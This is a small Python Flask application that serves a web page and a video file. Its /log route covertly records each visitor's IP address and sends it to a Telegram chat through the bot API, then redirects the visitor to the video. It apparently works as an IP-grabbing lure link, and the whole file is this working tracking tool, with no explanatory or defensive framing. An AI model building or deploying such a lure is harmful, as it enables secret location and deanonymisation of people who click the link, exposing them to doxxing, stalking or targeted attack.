
from flask import Flask, request, send_from_directory, redirect
import requests
import os

BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

app = Flask(__name__)

@app.route("/")
def index():
    return send_from_directory(".", "index.html")

@app.route("/video.mp4")
def video():
    return send_from_directory(".", "video.mp4")

@app.route("/log")
def log_ip():
    ip = request.remote_addr
    message = f"🛡️ IP زائر: {ip}"
    requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                 params={"chat_id": CHAT_ID, "text": message})
    return redirect("/video.mp4")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
